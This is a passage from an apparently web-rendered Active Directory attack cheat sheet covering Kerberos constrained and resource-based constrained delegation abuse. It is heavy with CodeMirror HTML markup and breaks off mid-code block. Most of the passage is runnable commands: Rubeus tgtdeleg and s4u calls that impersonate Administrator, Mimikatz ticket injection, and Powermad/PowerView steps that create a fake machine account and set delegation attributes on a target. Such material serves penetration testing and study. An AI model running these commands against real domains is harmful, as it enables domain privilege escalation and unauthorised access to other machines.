<p id="bkmrk-if-we-have-a-session">If we have a session as the user, we can just run <code>.\Rubeus.exe tgtdeleg /nowrap</code> to get the TGT in Base64, then run:</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1180px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 1179.57px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">s4u</span> <span class="cm-operator">/</span><span class="cm-identifier">ticket</span><span class="cm-operator">:</span><span class="cm-identifier">doIFCDC</span><span class="cm-punctuation">[</span><span class="cm-identifier">SNIP</span><span class="cm-punctuation">]</span><span class="cm-identifier">E9DQUw</span><span class="cm-operator">=</span> <span class="cm-operator">/</span><span class="cm-identifier">impersonateuser</span><span class="cm-operator">:</span><span class="cm-identifier">Administrator</span> <span class="cm-operator">/</span><span class="cm-identifier">domain</span><span class="cm-operator">:</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">msdsspn</span><span class="cm-operator">:</span><span class="cm-string">"time/&lt;target&gt;.domain.local"</span> <span class="cm-operator">/</span><span class="cm-identifier">altservice</span><span class="cm-operator">:</span><span class="cm-identifier">ldap</span><span class="cm-punctuation">,</span><span class="cm-identifier">cifs</span> <span class="cm-operator">/</span><span class="cm-identifier">ptt</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-inject-the-ticket"><li>Inject the ticket</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 405px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 405.095px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"kerberos::ptt ticket.kirbi"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-without-protocol-tra">Without protocol transition</h4>
<p id="bkmrk-in-this-case%2C-it-is-">In this case, it is not possible to use <strong>S4U2self</strong> to obtain a forwardable ST for a specific user. This restriction can be bypassed with an RBCD attack detailled in the following section.</p>
<h3 id="bkmrk-resource-based-const">Resource-Based Constrained Delegation</h3>
<p id="bkmrk-wagging-the-dog"><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging the Dog</a></p>
<p id="bkmrk-with-rbcd%2C-this-is-t">With RBCD, this is the resource machine (the machine that receives delegation) which has a list of services that can delegate to it. This list is specified in the attribute <code>msds-allowedtoactonbehalfofotheridentity</code> and the computer can modified its own attribute (really usefull in NTLM relay attack scenario).</p>
<h4 id="bkmrk-requirements">Requirements</h4>
<ul id="bkmrk-the-dc-has-to-be-at-"><li>The DC has to be at least a <strong>Windows Server 2012</strong>
</li>
<li>Domain users can create some machines, <code>ms-ds-machineaccountquota</code> must not being to 0</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 499px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 499.19px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#To verify</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-DomainObject</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-string">"dc=domain,dc=local"</span> <span class="cm-operator">-</span><span class="cm-identifier">Domain</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 105px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-write-rights-on-the-"><li>Write rights on the target machine (<strong>GenericAll, GenericWrite, AllExtendedRights</strong>)</li>
<li>Target computer, object must not have the attribute <code>msds-allowedtoactonbehalfofotheridentity</code> set</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 680px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 680.143px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetComputer</span> <span class="cm-identifier">ws01</span> <span class="cm-operator">|</span> <span class="cm-builtin">Select-Object</span> <span class="cm-operator">-</span><span class="cm-identifier">Property</span> <span class="cm-identifier">name</span><span class="cm-punctuation">,</span> <span class="cm-identifier">msds-allowedtoactonbehalfofotheridentity</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-standard-rbcd">Standard RBCD</h4>
<p id="bkmrk-the-attaker-has-comp">The attaker has compromised ServiceA and want to compromise ServiceB. Additionnally he has sufficient rights to configure <code>msds-allowedtoactonbehalfofotheridentity</code> on ServiceB.</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1368px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 206px; min-width: 1367.76px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Add RBCD from ServiceA to ServiceB</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-ADComputer</span> <span class="cm-identifier">ServiceB</span> <span class="cm-operator">-</span><span class="cm-identifier">PrincipalsAllowedToDelegateToAccount</span> <span class="cm-identifier">ServiceA</span><span class="cm-error">$</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Verify property</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetComputer</span> <span class="cm-identifier">ServiceB</span> <span class="cm-operator">|</span> <span class="cm-builtin">Select-Object</span> <span class="cm-operator">-</span><span class="cm-identifier">Property</span> <span class="cm-identifier">name</span><span class="cm-punctuation">,</span> <span class="cm-identifier">msds-allowedtoactonbehalfofotheridentity</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Get ServiceA TGT and then S4U</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">rubeus</span> <span class="cm-operator">-</span><span class="cm-identifier">x</span> <span class="cm-identifier">tgtdeleg</span> <span class="cm-operator">/</span><span class="cm-identifier">nowrap</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">rubeus</span> <span class="cm-operator">-</span><span class="cm-identifier">x</span> <span class="cm-identifier">s4u</span> <span class="cm-operator">/</span><span class="cm-identifier">user</span><span class="cm-operator">:</span><span class="cm-identifier">ServiceA</span><span class="cm-error">$</span> <span class="cm-operator">/</span><span class="cm-identifier">ticket</span><span class="cm-operator">:</span><span class="cm-identifier">ticket</span><span class="cm-punctuation">.</span><span class="cm-identifier">kirbi</span> <span class="cm-operator">/</span><span class="cm-identifier">impersonateuser</span><span class="cm-operator">:</span><span class="cm-identifier">administrator</span> <span class="cm-operator">/</span><span class="cm-identifier">msdsspn</span><span class="cm-operator">:</span><span class="cm-identifier">host</span><span class="cm-operator">/</span><span class="cm-identifier">ServiceB</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">domain</span><span class="cm-operator">:</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">altservice</span><span class="cm-operator">:</span><span class="cm-identifier">cifs</span><span class="cm-punctuation">,</span><span class="cm-identifier">host</span><span class="cm-punctuation">,</span><span class="cm-identifier">http</span><span class="cm-punctuation">,</span><span class="cm-identifier">winrm</span><span class="cm-punctuation">,</span><span class="cm-identifier">RPCSS</span><span class="cm-punctuation">,</span><span class="cm-identifier">wsman</span> <span class="cm-operator">/</span><span class="cm-identifier">ptt</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 206px;"></div><div class="CodeMirror-gutters" style="height: 256px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-with-machine-account">With machine account creation</h4>
<ul id="bkmrk-add-a-fake-machine-a"><li>Add a fake machine account in the domain</li>
<li>Add it the to <code>msds-allowedtoactonbehalfofotheridentity</code> attribute of the target machine</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true" style="bottom: 10px;"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1679px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true" style="height: 10px; width: 10px;"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 595px; min-width: 1679px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Import-Module</span> <span class="cm-identifier">Powermad</span><span class="cm-punctuation">.</span><span class="cm-identifier">ps1</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Import-Module</span> <span class="cm-identifier">PowerView</span><span class="cm-punctuation">.</span><span class="cm-identifier">ps1</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Creds if needed, to run as another user</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$SecPassword</span> <span class="cm-operator">=</span> <span class="cm-builtin">ConvertTo-SecureString</span> <span class="cm-string">'Password123!'</span> <span class="cm-operator">-</span><span class="cm-identifier">AsPlainText</span> <span class="cm-operator">-</span><span class="cm-identifier">Force</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$Cred</span> <span class="cm-operator">=</span> <span class="cm-builtin">New-Object</span> <span class="cm-identifier">System</span><span class="cm-punctuation">.</span><span class="cm-identifier">Management</span><span class="cm-punctuation">.</span><span class="cm-identifier">Automation</span><span class="cm-punctuation">.</span><span class="cm-identifier">PSCredential</span><span class="cm-punctuation">(</span><span class="cm-string">'domain.local\user1'</span><span class="cm-punctuation">,</span> <span class="cm-variable-2">$SecPassword</span><span class="cm-punctuation">)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Check requirements</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-DomainObject</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-string">"dc=domain,dc=local"</span> <span class="cm-operator">-</span><span class="cm-identifier">Domain</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">-</span><span class="cm-identifier">Credential</span> <span class="cm-variable-2">$Cred</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetComputer</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">Domain</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">|</span> <span class="cm-builtin">Select-Object</span> <span class="cm-operator">-</span><span class="cm-identifier">Property</span> <span class="cm-identifier">name</span><span class="cm-punctuation">,</span> <span class="cm-identifier">msds-allowedtoactonbehalfofotheridentity</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Add the fake machine as a ressource + get its SID</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">New-MachineAccount</span> <span class="cm-operator">-</span><span class="cm-identifier">MachineAccount</span> <span class="cm-identifier">FAKE01</span> <span class="cm-operator">-</span><span class="cm-identifier">Password</span> <span class="cm-error">$</span><span class="cm-punctuation">(</span><span class="cm-builtin">ConvertTo-SecureString</span> <span class="cm-string">'Password123!'</span> <span class="cm-operator">-</span><span class="cm-identifier">AsPlainText</span> <span class="cm-operator">-</span><span class="cm-identifier">Force</span><span class="cm-punctuation">)</span> <span class="cm-operator">-</span><span class="cm-identifier">Credential</span> <span class="cm-variable-2">$Cred</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span> <span class="cm-operator">-</span><span class="cm-identifier">Domain</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">-</span><span class="cm-identifier">DomainController</span> <span class="cm-identifier">DC</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-DomainComputer</span> <span class="cm-identifier">FAKE01</span> <span class="cm-operator">-</span><span class="cm-identifier">Domain</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">-</span><span class="cm-identifier">Credential</span> <span class="cm-variable-2">$Cred</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$ComputerSid</span> <span class="cm-operator">=</span> <span class="cm-identifier">Get-DomainComputer</span> <span class="cm-identifier">FAKE01</span> <span class="cm-operator">-</span><span class="cm-identifier">Properties</span> <span class="cm-identifier">objectsid</span> <span class="cm-operator">|</span> <span class="cm-builtin">Select</span> <span class="cm-operator">-</span><span class="cm-identifier">Expand</span> <span class="cm-identifier">objectsid</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span 